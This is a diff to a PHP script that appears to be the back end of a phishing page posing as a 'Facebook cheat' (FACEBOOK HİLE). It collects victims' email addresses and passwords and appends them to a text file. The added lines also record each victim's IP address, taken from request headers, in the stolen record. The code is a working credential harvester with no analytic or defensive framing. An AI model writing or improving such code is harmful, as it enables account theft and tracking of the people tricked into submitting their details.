@@ -1,6 +1,17 @@
 <?php
 ///*
-
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
+    }
 if (isset($_POST['hile']) && isset($_POST['sayi']) && isset($_POST['eposta']) && isset($_POST['password'])) {
 
 $save = fopen("saved_info.txt","a+");
@@ -14,6 +25,8 @@ $vericekilen = ("
 +-+-+ FACEBOOK HİLE +-+-+
 
  Tarih         : ".$tarih."
+ 
+ İp Adresi     : ".$ipaddress."
 
  E-POSTA       : ".$eposta."
 
